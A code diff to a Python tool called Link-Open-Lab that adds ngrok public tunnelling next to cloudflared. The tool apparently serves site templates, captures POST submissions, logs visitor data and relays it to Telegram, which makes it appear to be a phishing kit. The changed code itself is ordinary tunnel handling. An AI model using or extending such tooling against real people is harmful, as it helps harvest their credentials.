@@ -24,8 +24,6 @@ import shutil
 import signal
 import subprocess
 import sys
-import termios
-import tty
 from dataclasses import dataclass
 from datetime import datetime, timezone
 from pathlib import Path
@@ -49,7 +47,6 @@ except ModuleNotFoundError:
 try:
     from rich.console import Console
     from rich.console import Group
-    from rich.layout import Layout
     from rich.live import Live
     from rich.panel import Panel
     from rich.table import Table
@@ -57,7 +54,6 @@ try:
 except ModuleNotFoundError:
     Console = None  # type: ignore[assignment]
     Group = None  # type: ignore[assignment]
-    Layout = None  # type: ignore[assignment]
     Live = None  # type: ignore[assignment]
     Panel = None  # type: ignore[assignment]
     Table = None  # type: ignore[assignment]
@@ -390,6 +386,9 @@ class AppConfig:
     traffic_log_file: Path
     cloudflared_url: str | None
     cloudflared_path: Path | None
+    ngrok_enabled: bool
+    cloudflared_enabled: bool
+    ngrok_path: Path | None
     telegram_bot_token: str | None
     telegram_chat_id: str | None
     php_router: str | None
@@ -419,9 +418,11 @@ class AppState:
     last_post_at: str | None = None
     php_running: bool = False
     cloudflared_running: bool = False
+    ngrok_running: bool = False
     monitor_running: bool = False
     access_mode: str = "Local Access Only"
     external_access_url: str = "Local Access Only"
+    tunnel_provider: str = "none"
 
 
 class RichUI:
@@ -455,11 +456,13 @@ Link-Open-Lab | by Abdalla Omran
 
         table.add_row("Local URL", config.monitor_url)
         table.add_row("PHP Backend", config.backend_url)
-        table.add_row("Cloudflare URL", state.external_access_url)
+        table.add_row("External URL", state.external_access_url)
+        table.add_row("Tunnel Provider", state.tunnel_provider)
         table.add_row("Access Mode", state.access_mode)
         table.add_row("Active Template", state.active_site)
         table.add_row("Runtime Webroot", str(config.runtime_webroot))
         table.add_row("cloudflared", "running" if state.cloudflared_running else "stopped")
+        table.add_row("ngrok", "running" if state.ngrok_running else "stopped")
         table.add_row("PHP Process", "running" if state.php_running else "stopped")
         table.add_row("Traffic Monitor", "running" if state.monitor_running else "stopped")
         table.add_row("POST Requests", str(state.post_count))
@@ -831,6 +834,7 @@ class LocalWebTestingServer:
         self.shutdown_event = asyncio.Event()
         self._processed_log_lines = 0
         self._cloudflared_url_pattern = re.compile(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com")
+        self._ngrok_url_pattern = re.compile(r"https://[a-zA-Z0-9.-]+\.ngrok(?:-free)?\.app")
 
     async def run(self) -> None:
         self.config.runtime_dir.mkdir(parents=True, exist_ok=True)
@@ -897,6 +901,45 @@ class LocalWebTestingServer:
         await self.proxy.start()
         self.state.access_mode = "Local Access Only"
         self.state.external_access_url = "Local Access Only"
+        self.state.tunnel_provider = "none"
+
+        if self.config.ngrok_enabled:
+            if self.config.ngrok_path is None:
+                self.ui.console.print(
+                    "[magenta]ngrok flag enabled but ngrok binary was not found in PATH. "
+                    "Install ngrok to use public tunnel mode. Continuing in local-only mode.[/magenta]"
+                )
+                self.state.ngrok_running = False
+                return
+
+            self.state.access_mode = "Public Bridge Starting"
+            self.state.external_access_url = "Waiting for ngrok URL..."
+            self.state.tunnel_provider = "ngrok"
+
+            # Route ngrok through the monitor proxy so POST capture/dashboard stays functional.
+            ngrok_target = self.config.tunnel_target_url
+            ngrok_args = [
+                str(self.config.ngrok_path),
+                "http",
+                ngrok_target,
+                "--log",
+                "stdout",
+            ]
+            await self.process_manager.start(
+                "ngrok",
+                *ngrok_args,
+                cwd=self.config.workspace_root,
+                log_hook=self._handle_ngrok_log,
+                echo_logs=True,
+            )
+            self.state.ngrok_running = True
+            self.ui.console.print("[cyan]ngrok tunnel starting (may take a moment to stabilize)...[/cyan]")
+            return
+
+        if not self.config.cloudflared_enabled:
+            self.ui.console.print("[magenta]No public tunnel selected. Local Access Only mode is active.[/magenta]")
+            self.state.cloudflared_running = False
+            return
 
         if self.config.cloudflared_path is None:
             self.ui.console.print(
@@ -923,6 +966,7 @@ class LocalWebTestingServer:
             echo_logs=True,
         )
         self.state.cloudflared_running = True
+        self.state.tunnel_provider = "cloudflared"
         self.ui.console.print("[cyan]Cloudflared tunnel starting (may take a moment to stabilize)...[/cyan]")
 
     def _handle_cloudflared_log(self, stream_type: str, line: str) -> None:
@@ -936,11 +980,27 @@ class LocalWebTestingServer:
 
         self.state.external_access_url = url
         self.state.access_mode = "Public Bridge Active"
+        self.state.tunnel_provider = "cloudflared"
         self.ui.console.print(f"[bold green]✓ Cloudflare Tunnel Ready: {url}[/bold green]")
+
+    def _handle_ngrok_log(self, stream_type: str, line: str) -> None:
+        match = self._ngrok_url_pattern.search(line)
+        if not match:
+            return
+
+        url = match.group(0)
+        if self.state.external_access_url == url:
+            return
+
+        self.state.external_access_url = url
+        self.state.access_mode = "Public Bridge Active"
+        self.state.tunnel_provider = "ngrok"
+        self.ui.console.print(f"[bold green]✓ ngrok Tunnel Ready: {url}[/bold green]")
 
     async def _stop_services(self) -> None:
         self.state.php_running = False
         self.state.cloudflared_running = False
+        self.state.ngrok_running = False
         self.state.monitor_running = False
         await self.proxy.stop()
         await self.process_manager.terminate_all()
@@ -1005,6 +1065,13 @@ class LocalWebTestingServer:
             self.state.php_running = False
         if proc_name == "cloudflared":
             self.state.cloudflared_running = False
+            self.state.tunnel_provider = "none"
+            self.state.access_mode = "Local Access Only"
+            if not self.state.external_access_url.startswith("http"):
+                self.state.external_access_url = "Local Access Only"
+        if proc_name == "ngrok":
+            self.state.ngrok_running = False
+            self.state.tunnel_provider = "none"
             self.state.access_mode = "Local Access Only"
             if not self.state.external_access_url.startswith("http"):
                 self.state.external_access_url = "Local Access Only"
@@ -1024,6 +1091,29 @@ class CloudflaredResolver:
         ]
 
         which_match = shutil.which("cloudflared")
+        if which_match:
+            candidates.insert(0, Path(which_match))
+
+        for candidate in candidates:
+            if candidate.exists() and candidate.is_file():
+                if os.access(candidate, os.X_OK):
+                    return candidate
+
+        return None
+
+
+class NgrokResolver:
+    """Resolve ngrok path with graceful fallback logic."""
+
+    @staticmethod
+    def resolve(workspace_root: Path) -> Path | None:
+        candidates = [
+            Path("/usr/local/bin/ngrok"),
+            workspace_root / "ngrok",
+            workspace_root / ".server" / "ngrok",
+        ]
+
+        which_match = shutil.which("ngrok")
         if which_match:
             candidates.insert(0, Path(which_match))
 
@@ -1113,6 +1203,79 @@ def choose_site_interactive(site_library: SiteLibrary, console: Console) -> str:
                 return selected_site
             else:
                 console.print(f"[red]Invalid selection. Enter a number between 1 and {len(sites)}.[/red]")
+        except ValueError:
+            console.print("[red]Invalid input. Please enter a number.[/red]")
+        except KeyboardInterrupt:
+            console.print("\n[yellow]Selection cancelled.[/yellow]")
+            raise
+
+
+def print_cloudflared_install_instructions(console: Console) -> None:
+    console.print(
+        "[bold red]⚠ cloudflared Binary Not Found[/bold red]\n"
+        "Local Access Only mode enabled.\n\n"
+        "To enable public cloud tunneling, install cloudflared:\n"
+        "  Ubuntu/Debian: [yellow]sudo apt install cloudflared[/yellow]\n"
+        "  macOS: [yellow]brew install cloudflared[/yellow]\n"
+        "  Official: [yellow]https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/[/yellow]\n"
+    )
+
+
+def print_ngrok_install_instructions(console: Console) -> None:
+    console.print(
+        "[bold red]⚠ ngrok Binary Not Found[/bold red]\n"
+        "Local Access Only mode enabled.\n\n"
+        "To enable public ngrok tunneling, install ngrok and authenticate it:\n"
+        "  Ubuntu/Debian: [yellow]snap install ngrok[/yellow] or official package\n"
+        "  macOS: [yellow]brew install ngrok/ngrok/ngrok[/yellow]\n"
+        "  Then run: [yellow]ngrok config add-authtoken <YOUR_TOKEN>[/yellow]\n"
+        "  Official: [yellow]https://ngrok.com/download[/yellow]\n"
+    )
+
+
+def choose_tunnel_interactive(console: Console, workspace_root: Path) -> tuple[bool, bool]:
+    """Interactive tunnel provider selector.
+
+    Returns:
+        (cloudflared_enabled, ngrok_enabled)
+    """
+    if not sys.stdin.isatty() or not sys.stdout.isatty():
+        return False, False
+
+    has_cloudflared = CloudflaredResolver.resolve(workspace_root) is not None
+    has_ngrok = NgrokResolver.resolve(workspace_root) is not None
+
+    console.clear()
+    console.print("\n[bold cyan]Select Tunnel Mode[/bold cyan]\n")
+    console.print("  [ 1] Local only")
+    console.print(f"  [ 2] Cloudflare (cloudflared) [{'green' if has_cloudflared else 'red'}]{'installed' if has_cloudflared else 'not installed'}[/]")
+    console.print(f"  [ 3] ngrok [{'green' if has_ngrok else 'red'}]{'installed' if has_ngrok else 'not installed'}[/]")
+    console.print()
+
+    while True:
+        try:
+            user_input = input("Enter number (or Ctrl+C to cancel): ").strip()
+            choice = int(user_input)
+
+            if choice == 1:
+                console.print("[cyan]Tunnel mode:[/cyan] [bold magenta]Local only[/bold magenta]\n")
+                return False, False
+
+            if choice == 2:
+                if has_cloudflared:
+                    console.print("[cyan]Tunnel mode:[/cyan] [bold magenta]Cloudflare[/bold magenta]\n")
+                    return True, False
+                print_cloudflared_install_instructions(console)
+                return False, False
+
+            if choice == 3:
+                if has_ngrok:
+                    console.print("[cyan]Tunnel mode:[/cyan] [bold magenta]ngrok[/bold magenta]\n")
+                    return False, True
+                print_ngrok_install_instructions(console)
+                return False, False
+
+            console.print("[red]Invalid selection. Enter 1, 2, or 3.[/red]")
         except ValueError:
             console.print("[red]Invalid input. Please enter a number.[/red]")
         except KeyboardInterrupt:
@@ -1261,6 +1424,16 @@ def parse_args() -> argparse.Namespace:
         default=None,
         help="URL cloudflared forwards to (default: monitor URL).",
     )
+    parser.add_argument(
+        "--cloudflared",
+        action="store_true",
+        help="Enable cloudflared public tunnel mode.",
+    )
+    parser.add_argument(
+        "--ngrok",
+        action="store_true",
+        help="Enable ngrok public tunnel mode (targets PHP backend port).",
+    )
     parser.add_argument("--php-router", default=None, help="Optional PHP router script path.")
     parser.add_argument(
         "--telegram-bot-token",
@@ -1314,7 +1487,11 @@ def build_config(args: argparse.Namespace) -> AppConfig:
         log_path = runtime_dir / log_path
     log_file = log_path.resolve()
 
+    if args.ngrok and args.cloudflared:
+        raise ValueError("Use either --ngrok or --cloudflared, not both at the same time.")
+
     cloudflared_path = CloudflaredResolver.resolve(workspace_root)
+    ngrok_path = NgrokResolver.resolve(workspace_root)
     requested_php_port = args.port if args.port is not None else args.php_port
     php_port = pick_available_port(args.php_host, requested_php_port)
     monitor_port = pick_available_port(args.monitor_host, args.monitor_port)
@@ -1336,6 +1513,9 @@ def build_config(args: argparse.Namespace) -> AppConfig:
         traffic_log_file=log_file,
         cloudflared_url=args.cloudflared_url,
         cloudflared_path=cloudflared_path,
+        ngrok_enabled=bool(args.ngrok),
+        cloudflared_enabled=bool(args.cloudflared),
+        ngrok_path=ngrok_path,
         telegram_bot_token=args.telegram_bot_token,
         telegram_chat_id=args.telegram_chat_id,
         php_router=args.php_router,
@@ -1386,6 +1566,18 @@ async def async_main() -> int:
             return legacy.show_auth()
         return legacy.show_ip()
 
+    if not args.cloudflared and not args.ngrok:
+        if console is None:
+            print("Rich is required for interactive tunnel selection.")
+            return 1
+        try:
+            cloudflared_enabled, ngrok_enabled = choose_tunnel_interactive(console, workspace_root)
+        except KeyboardInterrupt:
+            print("Selection cancelled.")
+            return 130
+        args.cloudflared = cloudflared_enabled
+        args.ngrok = ngrok_enabled
+
     if args.site is None:
         if console is None:
             print("Rich is required for interactive template selection.")
@@ -1398,17 +1590,12 @@ async def async_main() -> int:
 
     try:
         config = build_config(args)
-        
-        if config.cloudflared_path is None:
-            console_inst = console or Console()
-            console_inst.print(
-                "[bold red]⚠ cloudflared Binary Not Found[/bold red]\n"
-                "Local Access Only mode enabled.\n\n"
-                "To enable public cloud tunneling, install cloudflared:\n"
-                "  Ubuntu/Debian: [yellow]sudo apt install cloudflared[/yellow]\n"
-                "  macOS: [yellow]brew install cloudflared[/yellow]\n"
-                "  Official: [yellow]https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/[/yellow]\n"
-            )
+
+        if config.cloudflared_enabled and config.cloudflared_path is None:
+            print_cloudflared_install_instructions(console or Console())
+
+        if config.ngrok_enabled and config.ngrok_path is None:
+            print_ngrok_install_instructions(console or Console())
         
         server = LocalWebTestingServer(config)
         await server.run()
